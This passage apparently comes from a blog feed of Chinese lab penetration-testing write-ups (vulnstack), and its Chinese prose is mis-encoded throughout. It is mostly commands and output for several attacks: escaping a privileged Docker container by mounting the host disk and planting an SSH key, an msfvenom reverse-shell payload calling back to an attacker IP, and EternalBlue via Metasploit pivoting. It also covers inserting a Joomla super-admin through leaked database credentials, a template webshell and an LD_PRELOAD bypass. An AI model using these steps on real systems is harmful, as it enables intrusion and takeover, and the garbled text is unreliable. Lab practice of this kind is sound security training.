<p>è¿è¡Œå®Œä¹‹å msfè¿›å…¥shellå°±ä¼šå¡ä½â€¦æ‰€ä»¥å°±æ¢ä¸€ç§æ–¹æ³• å¯ä»¥ä½¿ç”¨â€“privilegedï¼ˆç‰¹æƒæ¨¡å¼ï¼‰è¿›è¡Œé€ƒé€¸</p>
<h4 id="åˆ©ç”¨â€“privilegedç‰¹æƒæ¨¡å¼é€ƒé€¸"><a href="#åˆ©ç”¨â€“privilegedç‰¹æƒæ¨¡å¼é€ƒé€¸" class="headerlink" title="åˆ©ç”¨â€“privilegedç‰¹æƒæ¨¡å¼é€ƒé€¸"></a>åˆ©ç”¨â€“privilegedç‰¹æƒæ¨¡å¼é€ƒé€¸</h4><p>ä½¿ç”¨ç‰¹æƒæ¨¡å¼å‘å®¿ä¸»æœºçš„ç¡¬ç›˜ä¸­å†™å…¥sshç§é’¥ï¼Œå®ç°sshå…å¯†ç™»å½•å®¿ä¸»æœº</p>
<p>1.æŸ¥çœ‹ç£ç›˜æ–‡ä»¶ <code>fdisk -l</code></p>
<p><img src="/posts/e94e95f1/docker_fdisk.png"></p>
<p>2.æŸ¥çœ‹è®¾å¤‡æ–‡ä»¶ <code>ls /dev</code></p>
<p>3.æ–°å»ºç›®å½•è¿›è¡ŒæŒ‚è½½      <code>mkdir /test</code></p>
<p>4.å°†/dev/sda1æŒ‚è½½åˆ°/testç›®å½•ä¸­  <code>mount /dev/sda1 /test</code></p>
<p>5.æŸ¥çœ‹æ˜¯å¦æŒ‚è½½æˆåŠŸ <code>ls /test</code></p>
<p><img src="/posts/e94e95f1/mount_test.png"></p>
<p>6.åœ¨kaliæœ¬åœ°ä¸Šç”Ÿæˆsshå¯†é’¥ <code>ssh-keygen -f test</code> ï¼Œç„¶åä¼šç”Ÿæˆ<code>test</code> <code>test.pub</code></p>
<p>èµ‹äºˆ600æƒé™<code>chmod 600 test</code></p>
<p>7.å°†ç”Ÿæˆçš„å¯†é’¥å†™å…¥åˆ°ç›®æ ‡æœºå™¨ä¸­</p>
<p>ç”±äºå‰é¢å°† <code>sda1</code>æŒ‚è½½åˆ°äº†<code>/test</code> æ‰€ä»¥è®¿é—®/test/homeä¹Ÿå°±ç­‰åŒäºå»è®¿é—®å®¿ä¸»æœºçš„/homeç›®å½•</p>
<p><code>ls /test/home</code></p>
<p><img src="/posts/e94e95f1/ls_test_home.png"></p>
<p>æŸ¥çœ‹æ‰€æœ‰æ–‡ä»¶<code>ls -alh /test/home/ubuntu</code></p>
<p><img src="/posts/e94e95f1/ls_test_home_ubuntu.png"></p>
<p>æŸ¥çœ‹.sshæ–‡ä»¶ <code>ls -alh /test/home/ubuntu/.ssh/</code></p>
<p><img src="/posts/e94e95f1/ls_test_home_ubuntu_ssh.png"></p>
<p><code>cp -avx /test/home/ubuntu/.ssh/id_rsa.pub /test/home/ubuntu/.ssh/authorized_keys</code> # -avxå°†æƒé™ä¹Ÿä¸€èµ·èµ‹äºˆ</p>
<p><img src="/posts/e94e95f1/cp_key.png"></p>
<p><code>echo &gt; /test/home/ubuntu/.ssh/authorized_keys</code></p>
<p><code>cat test.pub</code> </p>
<p><code>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCf0H1/QT12pdJ04TXtsJ8C4n0CCa6l4G4MUpImanHscGsXHz8izRwWoPMuRMwSgnOC1ItEWLCvR1UGxR7VdlBlafxoan9e2nIDtGDth5w4h2aR4ac+HVTZL5mHCcx7frWqZ4sGgeX6SHswNmRqGTS8oleMULqhOvkQlA81ML0mwTgUIKTM4QNBCaB2pyC96LD6OPuO2ofzGbyjEqGuPxpI0dIHxJsL5DvwfKHYSmkuLJA65k0RRHAZrSdBE95NPqrzhgT+u33MTauhmCa2b8+mgX83AOo/mh+Upm+oqqvlkX/1PYvsUkXOpLBm/Oy/ZCWF2aTO+GbHmN2aQK766iChVl0ja04mNnmsaGiUl6MOxqqZ9jqZODpprkfatPuJrzq2Fan4ERlFO3Y7eq/o95qGkKaMdPkHWfiDiag2B+BFS/Xsvr9lKg17xcBG411aAuIhxWQJMHJHjdiM6as8kNbp+JBwU3Kr1M4i3K/Bg3rSlUPD6ibogfIQMTR1Vint2gs= kali@kali2020</code></p>
<br>

<p><code>echo &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCf0H1/QT12pdJ04TXtsJ8C4n0CCa6l4G4MUpImanHscGsXHz8izRwWoPMuRMwSgnOC1ItEWLCvR1UGxR7VdlBlafxoan9e2nIDtGDth5w4h2aR4ac+HVTZL5mHCcx7frWqZ4sGgeX6SHswNmRqGTS8oleMULqhOvkQlA81ML0mwTgUIKTM4QNBCaB2pyC96LD6OPuO2ofzGbyjEqGuPxpI0dIHxJsL5DvwfKHYSmkuLJA65k0RRHAZrSdBE95NPqrzhgT+u33MTauhmCa2b8+mgX83AOo/mh+Upm+oqqvlkX/1PYvsUkXOpLBm/Oy/ZCWF2aTO+GbHmN2aQK766iChVl0ja04mNnmsaGiUl6MOxqqZ9jqZODpprkfatPuJrzq2Fan4ERlFO3Y7eq/o95qGkKaMdPkHWfiDiag2B+BFS/Xsvr9lKg17xcBG411aAuIhxWQJMHJHjdiM6as8kNbp+JBwU3Kr1M4i3K/Bg3rSlUPD6ibogfIQMTR1Vint2gs= kali@kali2020&#39; &gt;&gt; /test/home/ubuntu/.ssh/authorized_keys    </code># å°†sshç§˜é’¥å†™å…¥authorized_keysæ–‡ä»¶</p>
<p><img src="/posts/e94e95f1/echo_ssh_rsa.png"></p>
<p>æŸ¥çœ‹æ˜¯å¦å†™å…¥æˆåŠŸï¼Œå‘ç°è¿˜æ˜¯æ²¡æˆåŠŸï¼Œä½¿ç”¨<code>echo &gt; /test/home/ubuntu/.ssh/authorized_keys </code>æ— æ³•æ¸…é™¤åŸæœ‰çš„å€¼ï¼Œåº”è¯¥æ˜¯æ²¡æœ‰å†™å…¥æƒé™</p>
<p><code> cat /test/home/ubuntu/.ssh/authorized_keys</code></p>
<p><img src="/posts/e94e95f1/cat_ssh_rsa.png"></p>
<p>å°è¯•å»ä¸Šä¼ ä¸€ä¸ªkey.shï¼Œå†…å®¹å¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp -avx /test/home/ubuntu/.ssh/id_rsa.pub /test/home/ubuntu/.ssh/authorized_keys</span><br><span class="line">echo &gt; /test/home/ubuntu/.ssh/authorized_keys</span><br><span class="line">echo &#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCf0H1/QT12pdJ04TXtsJ8C4n0CCa6l4G4MUpImanHscGsXHz8izRwWoPMuRMwSgnOC1ItEWLCvR1UGxR7VdlBlafxoan9e2nIDtGDth5w4h2aR4ac+HVTZL5mHCcx7frWqZ4sGgeX6SHswNmRqGTS8oleMULqhOvkQlA81ML0mwTgUIKTM4QNBCaB2pyC96LD6OPuO2ofzGbyjEqGuPxpI0dIHxJsL5DvwfKHYSmkuLJA65k0RRHAZrSdBE95NPqrzhgT+u33MTauhmCa2b8+mgX83AOo/mh+Upm+oqqvlkX/1PYvsUkXOpLBm/Oy/ZCWF2aTO+GbHmN2aQK766iChVl0ja04mNnmsaGiUl6MOxqqZ9jqZODpprkfatPuJrzq2Fan4ERlFO3Y7eq/o95qGkKaMdPkHWfiDiag2B+BFS/Xsvr9lKg17xcBG411aAuIhxWQJMHJHjdiM6as8kNbp+JBwU3Kr1M4i3K/Bg3rSlUPD6ibogfIQMTR1Vint2gs= kali@kali2020&#x27; &gt; /test/home/ubuntu/.ssh/authorized_keys</span><br><span class="line">cat /test/home/ubuntu/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>

<p>å¼€å¯httpæœåŠ¡ä½¿ç”¨é¶æœºä¸‹è½½</p>
<p><code>sudo python3 -m http.server 9999</code></p>
<p><code>wget http://192.168.0.128:9999</code></p>
<p><code>chmod 777 key.sh</code></p>
<p><code>./key.sh</code></p>
<p>è¿˜æ˜¯å†™å…¥å¤±è´¥äº†ï¼Œçœ‹äº†ä¸‹å¸ˆå‚…ä»¬ä¹Ÿæ˜¯è¿™æ ·åšçš„æ²¡å•¥é—®é¢˜ï¼Œç„¶åæˆ‘å°±å»ubuntué¶æœºä¸Šè¯•äº†ä¸‹å‘ç°ä¹Ÿæ²¡æ³•ä½¿ç”¨echoå†™å…¥ï¼Œåªèƒ½é€šè¿‡<code>sudo vim authorized_keys</code>æ‰‹åŠ¨å°†åœ¨kaliä¸Šç”Ÿæˆçš„å¯†é’¥å¤åˆ¶è¿›å»ï¼Œæ‰èƒ½åœ¨kaliä¸Šå…å¯†ç™»å½•</p>
<p><code>ssh -i test ubuntu@192.168.0.181</code></p>
<p><img src="/posts/e94e95f1/ssh_test_ubuntu.png"></p>
<h4 id="ä¸Šçº¿msf-1"><a href="#ä¸Šçº¿msf-1" class="headerlink" title="ä¸Šçº¿msf"></a>ä¸Šçº¿msf</h4><p>ç„¶ååœ¨msfç”Ÿæˆæœ¨é©¬ï¼Œä½¿ç”¨pythonå¼€å¯gttpæœåŠ¡ï¼Œä¸‹è½½åè¿æ¥shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.128 LPORT=8888 -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>

<p><img src="/posts/e94e95f1/msf_shell2.png"></p>
<p><code>use exploit/multi/handler </code></p>
<p> <code>set payload  linux/x86/meterpreter/reverse_tcp</code></p>
<p>çªç„¶ä¸å°å¿ƒæŠŠshell.elfæ–­æ‰äº† é‡æ–°ä¸Šçº¿äº†ä¸€ä¸ª session 12</p>
<h4 id="æ·»åŠ è·¯ç”±"><a href="#æ·»åŠ è·¯ç”±" class="headerlink" title="æ·»åŠ è·¯ç”±"></a>æ·»åŠ è·¯ç”±</h4><p><code> use post/multi/manage/autoroute</code></p>
<p><img src="/posts/e94e95f1/autoroute.png"></p>
<p><code>route print</code>æŸ¥çœ‹è·¯ç”±</p>
<p><img src="/posts/e94e95f1/route_print.png"></p>
<h4 id="è®¾ç½®ä»£ç†"><a href="#è®¾ç½®ä»£ç†" class="headerlink" title="è®¾ç½®ä»£ç†"></a>è®¾ç½®ä»£ç†</h4><p><code>use auxiliary/server/socks_proxy</code></p>
<p><img src="/posts/e94e95f1/set_socks_proxy.png"></p>
<p><code>sudo /etc/proxychains4.conf</code></p>
<p>ä¿®æ”¹kali proxychains4.confé…ç½®ä¸º<code>socks5 127.0.0.1 1080</code> </p>
<br>

<h3 id="å†…ç½‘æ¸—é€"><a href="#å†…ç½‘æ¸—é€" class="headerlink" title="å†…ç½‘æ¸—é€"></a>å†…ç½‘æ¸—é€</h3><h4 id="ä¿¡æ¯æ”¶é›†-1"><a href="#ä¿¡æ¯æ”¶é›†-1" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h4><p>ä½¿ç”¨smbæ‰«æ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line">set rhosts 192.168.183.0/24`</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>æ‰«åˆ°ä¸¤å°windowsæœºå™¨</p>
<p><img src="/posts/e94e95f1/smb_scan1.png"></p>
<p><img src="/posts/e94e95f1/smb_scan2.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.183.130   win2008</span><br><span class="line">192.168.183.148   win7</span><br></pre></td></tr></table></figure>

<p>ç”¨ms17-010æ‰«ä¸€ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">set rhosts 192.168.183.130,148</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/posts/e94e95f1/smb_ms17_010.png"></p>
<p>ä¸¤å°æœºå™¨éƒ½å­˜åœ¨ms17-010æ¼æ´</p>
<p>ä½¿ç”¨ms17-010è¿›è¡Œæ”»å‡»</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">setg proxies socks5:127.0.0.1:1080</span><br><span class="line">set rhosts 192.168.183.148</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set lport 4444</span><br><span class="line">set autorunscript post/windows/manage/migrate</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>ä¸¤å°æœºå™¨éƒ½æ²¡æ‰“é€šâ€¦â€¦</p>
<p><img src="/posts/e94e95f1/ms17010_fail.png"></p>
]]></content>
      <categories>
        <category>vulnstack</category>
      </categories>
      <tags>
        <tag>vulnstack</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnstack3é¶åœº</title>
    <url>/posts/2ce9ab7f/</url>
    <content><![CDATA[<h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>è®¾ç½®VM2 ç½‘æ®µä¸º 192.168.93.0/24 éœ€è¦é‡å¯ä¸€äº›centosçš„ç½‘å¡<code>service network restart</code></p>
<blockquote>
<p>web-centos     192.168.3.40ï¼ˆè¿™é‡Œçš„ipç»å¸¸ä¼šå˜åŒ–ï¼‰        192.168.93.100<br>web-ubuntu    192.168.93.120<br>win2008<br>win2012<br>win7</p>
</blockquote>
<p><img src="/posts/2ce9ab7f/tuopu.png"></p>
<h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><h4 id="nmapç«¯å£æ‰«æ"><a href="#nmapç«¯å£æ‰«æ" class="headerlink" title="nmapç«¯å£æ‰«æ"></a>nmapç«¯å£æ‰«æ</h4><p><code>sudo nmap 192.168.3.40 -sV</code></p>
<blockquote>
<p>kali@kali2020:~/Tools$ sudo nmap 192.168.3.40 -sV<br>[sudo] kali çš„å¯†ç ï¼š<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-07-25 16:15 CST<br>Nmap scan report for 192.168.3.40<br>Host is up (0.0082s latency).<br>Not shown: 995 filtered ports<br>PORT     STATE SERVICE    VERSION<br>22/tcp   open  ssh        OpenSSH 5.3 (protocol 2.0)<br>25/tcp   open  tcpwrapped<br>80/tcp   open  http       nginx 1.9.4<br>110/tcp  open  tcpwrapped<br>3306/tcp open  mysql      MySQL 5.7.27-0ubuntu0.16.04.1</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 17.42 seconds</p>
</blockquote>
<h4 id="ç›®å½•æ‰«æ"><a href="#ç›®å½•æ‰«æ" class="headerlink" title="ç›®å½•æ‰«æ"></a>ç›®å½•æ‰«æ</h4><p>ä½¿ç”¨dirmapæ‰«æ</p>
<p><code>sudo python3 dirmap.py -i 192.168.3.40 -lcf</code></p>
<p><img src="/posts/2ce9ab7f/dirmap_output.png"></p>
<p>ä½¿ç”¨dirsearchæ‰«æ</p>
<p><code>sudo python3  dirsearch.py -u http://192.168.3.40 -e */</code></p>
<p><img src="/posts/2ce9ab7f/dirsearch_output.png"></p>
<p>å¾—åˆ°å‡ ä¸ªæ•æ„Ÿç›®å½•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[200][text/html; charset=UTF-8][23.75kb] http://192.168.3.40/1.php                  </span><br><span class="line">[200][text/html; charset=UTF-8][0b] http://192.168.3.40/2.php                       </span><br><span class="line">[200][text/html; charset=utf-8][1.76kb] http://192.168.3.40/administrator/          </span><br><span class="line">[200][text/html; charset=utf-8][1.76kb] http://192.168.3.40/administrator/index.php </span><br><span class="line">[200][text/html][31.00b] http://192.168.3.40/bin/                                   </span><br><span class="line">[200][text/html][31.00b] http://192.168.3.40/cache/                                 </span><br><span class="line">[200][text/html; charset=UTF-8][0b] http://192.168.3.40/configuration.php           </span><br><span class="line">[200][None][1.88kb] http://192.168.3.40/configuration.php~                          </span><br><span class="line">[200][text/plain][1.43kb] http://192.168.3.40/htaccess.txt                          </span><br><span class="line">[200][text/html][31.00b] http://192.168.3.40/includes/                              </span><br><span class="line">[200][text/html; charset=utf-8][3.91kb] http://192.168.3.40/index.php               </span><br><span class="line">[200][text/plain][6.67kb] http://192.168.3.40/LICENSE.txt                           </span><br><span class="line">[200][text/html; charset=utf-8][2.67kb] http://192.168.3.40/index.php/login/        </span><br><span class="line">[200][text/plain][1.71kb] http://192.168.3.40/README.txt                            </span><br><span class="line">[200][text/plain][392.00b] http://192.168.3.40/robots.txt                           </span><br><span class="line">[200][text/html][31.00b] http://192.168.3.40/templates/                             </span><br><span class="line">[200][text/html][31.00b] http://192.168.3.40/tmp/                                   </span><br><span class="line">[200][text/plain][628.00b] http://192.168.3.40/web.config.txt     </span><br></pre></td></tr></table></figure>

<p>è®¿é—®1.phpå‘ç°æ˜¯ phpinfoé¡µé¢</p>
<p><img src="/posts/2ce9ab7f/phpinfo.png"></p>
<p>è®¿é—®<code>http://192.168.3.40/configuration.php~</code>åº”è¯¥æ˜¯é…ç½®æ–‡ä»¶çš„å¤‡ä»½</p>
<p>å¾—åˆ°æ•°æ®åº“çš„è´¦å·å¯†ç </p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public $dbtype = &#x27;mysqli&#x27;;</span><br><span class="line">public $host = &#x27;localhost&#x27;;</span><br><span class="line">public $user = &#x27;testuser&#x27;;</span><br><span class="line">public $password = &#x27;cvcvgjASD!@&#x27;;</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/posts/2ce9ab7f/sql_config.png"></p>
<p>è®¿é—®<code>http://192.168.3.40/administrator/  </code>çœ‹åˆ°æ˜¯Joomla! æ­å»ºçš„ç½‘ç«™ï¼Œå¯ä»¥ä½¿ç”¨<code>joomscan</code></p>
<p><code>sudo perl joomscan.pl -u 192.168.3.40  </code></p>
<br>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ•°æ®åº“  mysql</span><br><span class="line">        è´¦å·:testuser       å¯†ç :cvcvgjASD!@</span><br><span class="line">æ•æ„Ÿç›®å½•</span><br><span class="line">        http://192.168.3.40/1.php                 phpinfo</span><br><span class="line">        http://192.168.3.40/administrator/        åå°ç™»å½•é¡µé¢ï¼Œä½¿ç”¨Joomla</span><br><span class="line">        http://192.168.3.40/configuration.php~    å¤‡ä»½é…ç½®æ–‡ä»¶</span><br><span class="line">        http://192.168.3.40/robots.txt </span><br><span class="line">        http://192.168.3.40/web.config.txt  </span><br><span class="line">æ–‡ä»¶è·¯å¾„  	/var/www/html</span><br><span class="line">å¼€æ”¾ç«¯å£    22ï¼Œ25ï¼Œ80ï¼Œ110ï¼Œ3306</span><br><span class="line">æ“ä½œç³»ç»Ÿ    ubuntu16.04.1</span><br><span class="line">åå°ç®¡ç†    ä½¿ç”¨Joomla3.9.12</span><br><span class="line">PHPç‰ˆæœ¬     7.1.32</span><br><span class="line">Apache/2.4.18 (Ubuntu)</span><br><span class="line">User/Group	www-data(33)/33</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><h4 id="ç™»å½•mysqlåˆ›å»ºç”¨æˆ·"><a href="#ç™»å½•mysqlåˆ›å»ºç”¨æˆ·" class="headerlink" title="ç™»å½•mysqlåˆ›å»ºç”¨æˆ·"></a>ç™»å½•mysqlåˆ›å»ºç”¨æˆ·</h4><p><code>mysql -utestuser -h 192.168.3.40 -p</code></p>
<p><img src="/posts/2ce9ab7f/mysql_conn.png"></p>
<p>æœ‰ä¸¤ä¸ªusersè¡¨ åˆ†åˆ«ä¸º<code>am2zu_users</code>  <code>umnbt_users</code>çœ‹ä¸‹è¿™ä¸¤ä¸ªè¡¨ä¸­æœ‰ä»€ä¹ˆæœ‰ç”¨ä¿¡æ¯åˆ©ç”¨</p>
<p><img src="/posts/2ce9ab7f/select_user1.png"></p>
<p><img src="/posts/2ce9ab7f/select_user2.png"></p>
<p><a href="https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn">Joomalé€šè¿‡æ•°æ®åº“æ·»åŠ æ–°è¶…çº§ç®¡ç†å‘˜</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO `am2zu_users` (`name`, `username`, `password`, `params`, `registerDate`, `lastvisitDate`, `lastResetTime`) VALUES (&#x27;Administrator2&#x27;, &#x27;admin2&#x27;, &#x27;d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199&#x27;, &#x27;&#x27;, NOW(), NOW(), NOW()); </span><br><span class="line"></span><br><span class="line">INSERT INTO `am2zu_user_usergroup_map` (`user_id`,`group_id`) VALUES (LAST_INSERT_ID(),&#x27;8&#x27;);</span><br></pre></td></tr></table></figure>

<p><img src="/posts/2ce9ab7f/login_error.png"></p>
<p>åˆ›å»ºå®Œå‘ç°æ— æ³•ç™»å½•ï¼Œé‡æ–°åˆ›å»ºäº†ä¸€ä¸ª <code>admin3</code>  <code>secret</code>æˆåŠŸè¿›å…¥åå°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO `am2zu_users`</span><br><span class="line">   (`name`, `username`, `password`, `params`, `registerDate`, `lastvisitDate`, `lastResetTime`)</span><br><span class="line">VALUES (&#x27;Administrator3&#x27;, &#x27;admin3&#x27;,</span><br><span class="line">    &#x27;d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199&#x27;, &#x27;&#x27;, NOW(), NOW(), NOW());</span><br><span class="line"></span><br><span class="line">INSERT INTO `am2zu_user_usergroup_map` (`user_id`,`group_id`)</span><br><span class="line">VALUES (LAST_INSERT_ID(),&#x27;8&#x27;);</span><br></pre></td></tr></table></figure>

<p><img src="/posts/2ce9ab7f/login_success.png"></p>
<h4 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h4><p>åœ¨Extensionsä¸­é€‰æ‹©Beez3æ¨¡æ¿ï¼Œç„¶åç‚¹å‡»New File åˆ›å»ºä¸€ä¸ªshell.php</p>
<p><img src="/posts/2ce9ab7f/beez3.png"></p>
<p><img src="/posts/2ce9ab7f/create_shell_php.png"></p>
<p><img src="/posts/2ce9ab7f/shell.png"></p>
<p>shell.phpåœ¨templates/beez3ç›®å½•ä¸‹</p>
<p>è®¿é—®éªŒè¯æ˜¯å¦æˆåŠŸä¸Šä¼ shell</p>
<p><img src="/posts/2ce9ab7f/shell_success.png"></p>
<h4 id="disable-functionsç»•è¿‡"><a href="#disable-functionsç»•è¿‡" class="headerlink" title="disable_functionsç»•è¿‡"></a>disable_functionsç»•è¿‡</h4><h5 id="èšå‰‘disable-functionsæ’ä»¶"><a href="#èšå‰‘disable-functionsæ’ä»¶" class="headerlink" title="èšå‰‘disable_functionsæ’ä»¶"></a>èšå‰‘disable_functionsæ’ä»¶</h5><p>ä½¿ç”¨èšå‰‘è¿æ¥shellï¼Œåœ¨æ‰§è¡Œå‘½ä»¤æ—¶ï¼Œä¸è®ºå†™ä»€ä¹ˆéƒ½åªä¼šè¿”å›<code>ret=127</code></p>
<p><img src="/posts/2ce9ab7f/ret_127.png"></p>
<p><img src="/posts/2ce9ab7f/disable_func.png"></p>
<p>ä½¿ç”¨èšå‰‘çš„disable_functionsæ’ä»¶ï¼Œé€‰æ‹©<code>PHP7_GC_UAF</code> æˆåŠŸæ‰§è¡Œå‘½ä»¤</p>
<p><img src="/posts/2ce9ab7f/shell_exec.png"></p>
<h5 id="ä½¿ç”¨LD-PRELOADç»•è¿‡"><a href="#ä½¿ç”¨LD-PRELOADç»•è¿‡" class="headerlink" title="ä½¿ç”¨LD_PRELOADç»•è¿‡"></a>ä½¿ç”¨LD_PRELOADç»•è¿‡</h5><p>å·¥å…·ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
<p>ä½¿ç”¨èšå‰‘ä¸Šä¼  bypass_diablefunc.php å’Œ bypass_diablefunc_x64.so åˆ° /templates/beez3/</p>
<p>è®¿é—®<code>http://192.168.3.41/templates/beez3/bypass_disablefunc.php</code></p>
<p>payload:<code>http://192.168.3.41/templates/beez3/bypass_disablefunc.php?cmd=whoami&amp;outpath=/tmp/test&amp;sopath=/var/www/html/templates/beez3/bypass_disablefunc_x64.so</code></p>
<p><img src="/posts/2ce9ab7f/LD_PRELOAD.png"></p>
<h4 id="æ•æ„Ÿä¿¡æ¯æ”¶é›†"><a href="#æ•æ„Ÿä¿¡æ¯æ”¶é›†" class="headerlink" title="æ•æ„Ÿä¿¡æ¯æ”¶é›†"></a>æ•æ„Ÿä¿¡æ¯æ”¶é›†</h4><p><code>ifconfig </code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ens33     Link encap:Ethernet  HWaddr 00:0c:29:ab:32:ac  </span><br><span class="line">          inet addr:192.168.93.120  Bcast:192.168.93.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::20c:29ff:feab:32ac/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:145075 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:86884 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:17884352 (17.8 MB)  TX bytes:24388894 (24.3 MB)</span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:65536  Metric:1</span><br><span class="line">          RX packets:380140 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:380140 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1 </span><br><span class="line">          RX bytes:28142732 (28.1 MB)  TX bytes:28142732 (28.1 MB)</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨èšå‰‘è®¿é—®ä¸‹/home å’Œ /tmpæ–‡ä»¶ä¸‹å†…å®¹ ï¼Œå‘ç°/tmp/mysql/test.txtï¼Œå†…å®¹ä¸ºä¸‹:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adduser sswwwuser</span><br><span class="line">passwd wwwuser_123Aqx</span><br></pre></td></tr></table></figure>

<p><code>uname -a </code>æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Linux ubuntu 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>

<p><code>cat /etc/passwd</code> æŸ¥çœ‹ç”¨æˆ·</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false</span><br><span class="line">systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false</span><br><span class="line">syslog:x:104:108::/home/syslog:/bin/false</span><br><span class="line">_apt:x:105:65534::/nonexistent:/bin/false</span><br><span class="line">lxd:x:106:65534::/var/lib/lxd/:/bin/false</span><br><span class="line">messagebus:x:107:111::/var/run/dbus:/bin/false</span><br><span class="line">uuidd:x:108:112::/run/uuidd:/bin/false</span><br><span class="line">dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false</span><br><span 